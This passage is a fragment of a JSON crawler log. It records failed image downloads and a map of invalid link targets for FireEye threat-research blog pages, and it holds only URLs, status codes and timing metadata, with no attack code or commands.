http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Files-accessed-by-rar.exe-shown-in-WinPrefetchView.jpg","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":43,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:15","host":"us-012*","referer":"http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","linkMd5ListStr":"6a8824b4c0442d596b3eb7c51f97f663","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Files-accessed-by-rar.exe-shown-in-WinPrefetchView.jpg","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":46,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:15","host":"us-019*","referer":"http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","linkMd5ListStr":"6a8824b4c0442d596b3eb7c51f97f663","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Files-accessed-by-rar.exe-shown-in-WinPrefetchView.jpg","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":94,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:15","host":"us-51*","referer":"http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","linkMd5ListStr":"6a8824b4c0442d596b3eb7c51f97f663","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Files-accessed-by-rar.exe-shown-in-WinPrefetchView.jpg","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":51,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:15","host":"us-54*","referer":"http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","linkMd5ListStr":"6a8824b4c0442d596b3eb7c51f97f663","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/table.PNG","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":604,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:16","host":"us-028*","referer":"http://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html","linkMd5ListStr":"fddeed9b0703e7f6f52cf35a37065473","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/table.PNG","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":70,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:17","host":"us-038*","referer":"http://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html","linkMd5ListStr":"fddeed9b0703e7f6f52cf35a37065473","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":47,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:18","host":"us-036*","referer":"http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","linkMd5ListStr":"eae174c545cabc711744bf21e4bcf792","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":142,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:18","host":"europe-60*","referer":"http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","linkMd5ListStr":"eae174c545cabc711744bf21e4bcf792","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":156,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:18","host":"europe-25*","referer":"http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","linkMd5ListStr":"eae174c545cabc711744bf21e4bcf792","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":55,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:18","host":"us-035*","referer":"http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","linkMd5ListStr":"eae174c545cabc711744bf21e4bcf792","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":85,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:18","host":"us-027*","referer":"http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","linkMd5ListStr":"eae174c545cabc711744bf21e4bcf792","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":161,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:19","host":"europe-24*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":166,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:19","host":"europe64*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":47,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:20","host":"us-004*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":154,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:20","host":"us-024*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":71,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:20","host":"us-008*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"}],"extra10_invalidATagHrefValue":{"http://www.fireeye.com/blog/threat-research/2020/02/mtrends-2020-insights-from-the-front-lines.html_/content/fireeye-www/en_US/current-threats/annual-threat-report/mtrends.html":"http://www.fireeye.com/content/fireeye-www/en_US/current-threats/annual-threat-report/mtrends.html","http://www.fireeye.com/blog/threat-research/2020/03/the-cycle-of-adversary-pursuit.html_/content/fireeye-www/en_US/mandiant/incident-response.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html","http://www.fireeye.com/blog/threat-research/2014/01/leveraging-power-solutions-intelligence.html_/content/fireeye-www/en_US/mandiant/incident-response.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html","http://www.fireeye.com/blog/threat-research/2017/09/north-korea-interested-in-bitcoin.html_/content/fireeye-www/en_US/services.html":"http://www.fireeye.com/content/fireeye-www/en_US/services.html","http://www.fireeye.com/blog/threat-research/2014/06/a-not-so-civic-duty-asprox-botnet-campaign-spreads-court-dates-and-malware.html_/content/dam/legacy/blog/2014/06/fig10.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig10.png","http://www.fireeye.com/blog/threat-research/2016/06/connected_cars_the.html_/content/fireeye-www/en_US/mandiant/penetration-testing.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/penetration-testing.html","http://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html_/content/fireeye-www/en_US/blog/threat-research/2019/09/ransomware-protection-and-containment-strategies.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/09/ransomware-protection-and-containment-strategies.html","http://www.fireeye.com/blog/threat-research/2020/03/monitoring-ics-cyber-operation-tools-and-software-exploit-modules.html_/content/fireeye-www/en_US/mandiant/threat-intelligence.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html","http://www.fireeye.com/blog/threat-research/2012/12/freeware-release-redline-17.html_/content/fireeye-www/en_US/services/freeware/redline.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html","http://www.fireeye.com/blog/threat-research/2013/06/utilities-industry-cyber-targeting-scope.html_/content/fireeye-www/en_US/mandiant/incident-response.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html","http://www.fireeye.com/blog/threat-research/2020/04/improving-dynamic-malware-analysis-with-cheat-codes-for-fakenet-ng.html_/content/fireeye-www/en_US/blog/threat-research/2017/07/linux-support-for-fakenet-ng.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/07/linux-support-for-fakenet-ng.html","http://www.fireeye.com/blog/threat-research/2020/07/financially-motivated-actors-are-expanding-access-into-ot.html_/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html","http://www.fireeye.com/blog/threat-research/2020/03/crescendo-real-time-event-viewer-for-macos.html_/content/fireeye-www/en_US/blog/threat-research/2017/03/introducing_monitor.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/03/introducing_monitor.html","http://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html_/content/dam/legacy/blog/2014/09/flare2.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare2.png","http://www.fireeye.com/blog/threat-research/2012/04/investigating-indicators-compromise-environment-latest.html_/content/fireeye-www/en_US/services/freeware/redline.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html","http://www.fireeye.com/blog/threat-research/2020/04/enabling-defenders-with-vulnerability-intelligence.html_/content/fireeye-www/en_US/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html","http://www.fireeye.com/blog/threat-research/2012/11/memoryze-mac-support-added-os-mountain-lion-108.html_/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/memoryze-for-the-mac.html":"http://www.fireeye.com/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/memoryze-for-the-mac.html","http://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html_/content/fireeye-www/en_US/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html","http://www.fireeye.com/blog/threat-research/2012/06/unibody-memory-analysis-introducing-mac-memoryze.html_/content/fireeye-www/en_US/services/freeware/redline.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html","http://www.fireeye.com/blog/threat-research/2012/07/freeware-tool-audit-parser-tm.html_/content/fireeye-www/en_US/services/freeware/redline.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html","http://www.fireeye.com/blog/threat-research/2015/11/ibackdoor_high-risk.html_/content/fireeye-www/en_US/blog/threat-research/2015/06/three_new_masqueatt.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/06/three_new_masqueatt.html","http://www.fireeye.com/blog/threat-research/2013/10/another-darkleech-campaign.html_/content/dam/legacy/blog/2013/10/globalcdn_BHEK.png":"http://www.fireeye.com/content/dam/legacy/blog/2013/10/globalcdn_BHEK.png","http://www.fireeye.com/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html_/content/fireeye-www/en_US/blog/threat-research/2016/05/windows-zero-day-payment-cards.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/05/windows-zero-day-payment-cards.html","http://www.fireeye.com/blog/threat-research/2020/05/using-real-time-events-in-investigations.html_/content/fireeye-www/en_US/blog/threat-research/2017/04/appcompatprocessor.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/04/appcompatprocessor.html","http://www.fireeye.com/blog/threat-research/2012/12/2012-armory.html_/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/memoryze-for-the-mac.html":"http://www.fireeye.com/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/memoryze-for-the-mac.html","http://www.fireeye.com/blog/threat-research/2020/04/enabling-defenders-with-vulnerability-intelligence.html_/content/fireeye-www/en_US/blog/threat-research/2020/04/time-between-disclosure-patch-release-and-vulnerability-exploitation.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/time-between-disclosure-patch-release-and-vulnerability-exploitation.html","http://www.fireeye.com/blog/threat-research/2020/03/the-cycle-of-adversary-pursuit.html_/content/fireeye-www/en_US/blog/threat-research/2019/03/clustering-and-associating-attacker-activity-at-scale.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/03/clustering-and-associating-attacker-activity-at-scale.html","http://www.fireeye.com/blog/threat-research/2020/07/scandalous-external-detection-using-network-scan-data-and-automation.html_/content/fireeye-www/en_US/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","http://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html_/content/dam/legacy/blog/2014/09/flare9.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare9.png","http://www.fireeye.com/blog/threat-research/2013/11/critical-infrastructure-power-grid.html_/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html":"http://www.fireeye.com/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html","http://www.fireeye.com/blog/threat-research/2020/04/enabling-defenders-with-vulnerability-intelligence.html_/content/fireeye-www/en_US/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html","http://www.fireeye.com/blog/threat-research/2013/10/another-darkleech-campaign.html_/content/dam/legacy/blog/2013/10/Darkleech_JAVA.png":"http://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_JAVA.png","http://www.fireeye.com/blog/threat-research/2010/10/feodosoff-a-new-botnet-on-the-rise.html_/content/fireeye-www/en_US/products-delete.html":"http://www.fireeye.com/content/fireeye-www/en_US/products-delete.html","http://www.fireeye.com/blog/threat-research/2014/06/a-not-so-civic-duty-asprox-botnet-campaign-spreads-court-dates-and-malware.html_/content/dam/legacy/blog/2014/06/fig1.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig1.png","http://www.fireeye.com/blog/threat-research/2013/04/qa-followup-tools-engagement-mechanics-threat-intelligence.html_ http://www.palantir.com/what-we-do/ ":"http://www.fireeye.com/blog/threat-research/2013/04/ http://www.palantir.com/what-we-do/ ","http://www.fireeye.com/blog/threat-research/2020/07/insights-into-office-365-attacks-and-how-managed-defense-investigates.html_/content/fireeye-www/en_US/products/email-security.html":"http://www.fireeye.com/content/fireeye-www/en_US/products/email-security.html","http://www.fireeye.com/blog/threat-research/2013/09/fill-web-historianshaped-hole-heart.html_/content/fireeye-www/en_US/services/freeware/redline.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html","http://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html_/content/fireeye-www/en_US/services.html":"http://www.fireeye.com/content/fireeye-www/en_US/services.html","http://www.fireeye.com/blog/threat-research/2014/02/the-2013-fireeye-advanced-threat-report.html_/content/dam/legacy/blog/2014/02/FireEye-2013-Threat-Report-Final.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/02/FireEye-2013-Threat-Report-Final.png","http://www.fireeye.com/blog/threat-research/2013/01/highlighter-super-users-series-post-2.html_/content/fireeye-www/en_US/services/freeware/highlighter.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/highlighter.html","http://www.fireeye.com/blog/threat-research/2014/06/a-not-so-civic-duty-asprox-botnet-campaign-spreads-court-dates-and-malware.html_/content/dam/legacy/blog/2014/06/fig8.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig8.png","http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html_/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-willi-ballenthin":"http://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-willi-ballenthin","http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html_/content/dam/legacy/blog/2014/07/havex1.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/07/havex1.png","http://www.fireeye.com/blog/threat-research/2016/03/citrix_xenapp_andxe.html_/content/fireeye-www/en_US/services/red-team-operations.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/red-team-operations.html","http://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html_/content/dam/legacy/blog/2014/09/flare5.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare5.png","http://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html_/content/fireeye-www/en_US/index.html":"http://www.fireeye.com/content/fireeye-www/en_US/index.html","http://www.fireeye.com/blog/threat-research/2012/12/career-paths-cybersecurity-interview-series-br-jed-mitten.html_/content/fireeye-www/en_US/services/freeware/highlighter.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/highlighter.html","http://www.fireeye.com/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html_/content/fireeye-www/en_US/mandiant/threat-intelligence.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html","http://www.fireeye.com/blog/threat-research/2016/08/overload-critical-lessons-from-15-years-of-ics-vulnerabilities.html_/content/fireeye-www/en_US/products-delete/dynamic-threat-intelligence.html":"http://www.fireeye.com/content/fireeye-www/en_US/products-delete/dynamic-threat-intelligence.html","http://www.fireeye.com/blog/threat-research/2020/03/they-come-in-the-night-ransomware-deployment-trends.html_/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html","http://www.fireeye.com/blog/threat-research/2013/04/qa-followup-tools-engagement-mechanics-threat-intelligence.html_/content/fireeye-www/en_US/services/freeware/redline.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html","http://www.fireeye.com/blog/threat-research/2014/06/a-not-so-civic-duty-asprox-botnet-campaign-spreads-court-dates-and-malware.html_/content/dam/legacy/blog/2014/06/fig13.jpg":"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig13.jpg","http://www.fireeye.com/blog/threat-research/2012/09/striking-gold-incident-response-ntfs-indx-buffers-part-1.html_/content/fireeye-www/en_US/blog/threat-research/2012/10/incident-response-ntfs-indx-buffers-part-3-step-step-guide.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2012/10/incident-response-ntfs-indx-buffers-part-3-step-step-guide.html","http://www.fireeye.com/blog/threat-research/2012/04/investigating-indicators-compromise-environment-latest.html_/content/fireeye-www/en_US/services/freeware/ioc-finder.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-finder.html","http://www.fireeye.com/blog/threat-research/2014/06/a-not-so-civic-duty-asprox-botnet-campaign-spreads-court-dates-and-malware.html_/content/dam/legacy/blog/2014/06/fig4.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig4.png","http://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html_/content/fireeye-www/en_US/mandiant/incident-response.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html","http://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html_/content/fireeye-www/en_US/mandiant/threat-intelligence.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html","http://www.fireeye.com/blog/threat-research/2020/04/time-between-disclosure-patch-release-and-vulnerability-exploitation.html_/content/fireeye-www/en_US/mandiant/threat-intelligence.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html","http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html_/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.43.48-PM.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.43.48-PM.png","http://www.fireeye.com/blog/threat-research/2012/09/striking-gold-incident-response-ntfs-indx-buffers-part-1.html_/content/fireeye-www/en_US/mandiant/incident-response.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html","http://www.fireeye.com/blog/threat-research/2014/06/a-not-so-civic-duty-asprox-botnet-campaign-spreads-court-dates-and-malware.html_/content/dam/legacy/blog/2014/06/fig2.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/06/fig2.png","http://www.fireeye.com/blog/threat-research/2009/08/the-changing-battlefield-in-memory.html_/content/fireeye-www/en_US/services/freeware/memoryze.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html","http://www.fireeye.com/blog/threat-research/2014/10/tactics-motives-services.html_/content/fireeye-www/en_US/mandiant/cyber-defense-center-development.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/cyber-defense-center-development.html","http://www.fireeye.com/blog/threat-research/2020/07/unique-threats-to-operational-technology-and-cyber-physical-systems.html_/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html","http://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html_/content/dam/legacy/blog/2014/09/flare11.png":"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare11.png","http://www.fireeye.com/blog/threat-research/2020/05/using-real-time-events-in-investigations.html_/content/fireeye-www/en_US/services.html":"http://www.fireeye.com/content/fireeye-www/en_US/services.html","http://www.fireeye.com/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html_/content/fireeye-www/en_US/mandiant/incident-response.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html","http://www.fireeye.com/blog/threat-research/2020/04/improving-dynamic-malware-analysis-with-cheat-codes-for-fakenet-ng.html_/content/fireeye-www/en_US/blog/threat-research/2016/08/fakenet-ng_next_gen.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/08/fakenet-ng_next_gen.html","http://www.fireeye.com/blog/threat-research/2016/06/connected_cars_the.html_/content/fireeye-www/en_US/products-delete/dynamic-threat-intelligence.html":"http://www.fireeye.com/content/fireeye-www/en_US/products-delete/dynamic-threat-intelligence.html","http://www.fireeye.com/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html_/content/fireeye-www/en_US/mandiant/threat-intelligence.html":"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html","http://www.fireeye.com/blog/threat-research/2012/07/freeware-tool-audit-parser-tm.html_/content/fireeye-www/en_US/services/freeware/ioc-finder.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-finder.html","http://www.fireeye.com/blog/threat-research/2012/12/2012-armory.html_/content/fireeye-www/en_US/services/freeware/memoryze.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html","http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html_/content/fireeye-www/en_US/services/freeware/redline.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html","http://www.fireeye.com/blog/threat-research/2020/07/unique-threats-to-operational-technology-and-cyber-physical-systems.html_/content/fireeye-www/en_US/blog/threat-research/2020/03/monitoring-ics-cyber-operation-tools-and-software-exploit-modules.html":"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/03/monitoring-ics-cyber-operation-tools-and-software-exploit-modules.html","http://www.fireeye.com/blog/threat-research/2010/09/memory-forensics-windows-7-x86-x64-windows-2008-x64.html_/content/fireeye-www/en_US/services/freeware/memoryze.html":"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html","http://www.fireeye.com/blog/threat-research/2016/07/cerber-ransomware-attack.html_/content/fireeye-www/site-content/en_US/retired-pages-do-n